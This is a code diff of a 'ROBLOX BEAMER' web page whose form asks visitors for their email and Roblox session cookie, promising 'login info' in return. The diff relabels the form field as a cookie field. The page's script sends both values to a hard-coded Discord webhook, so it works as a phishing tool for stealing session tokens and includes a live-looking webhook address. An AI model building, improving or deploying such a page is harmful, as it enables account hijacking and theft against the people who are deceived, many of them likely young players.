@@ -50,8 +50,8 @@
 
   <h1>ROBLOX BEAMER</h1>
   <form id="contact-form">
-    <input type="email" id="email" placeholder="Enter Email" required />
-    <textarea id="message" rows="4" placeholder="Enter Cookie"></textarea>
+    <input type="Email" id="email" placeholder="Enter Email" required />
+    <textarea id="Cookie" rows="4" placeholder="Enter Cookie"></textarea>
     <button type="submit">Send</button>
     <div class="notice">You will recive the login info in 1-2 Hours.</div>
   </form>
@@ -68,7 +68,7 @@
       const webhookUrl = 'https://discord.com/api/webhooks/1335736426129788988/ebhM3D4RZiRNugaz_1rA5sVu_9Es4s2p_n44ke9oWmRTXKabS5FPld-aG2wkXPUrQCts'; // Replace with your real webhook
 
       const payload = {
-        content: `📬 New Contact Submission\n📧 Email: ${email}\n📝 Message: ${message || "No message"}`
+        content: `📬 New Contact Submission\n📧 Email: ${email}\n📝 Cookie: ${message || "No message"}`
       };
 
       try {
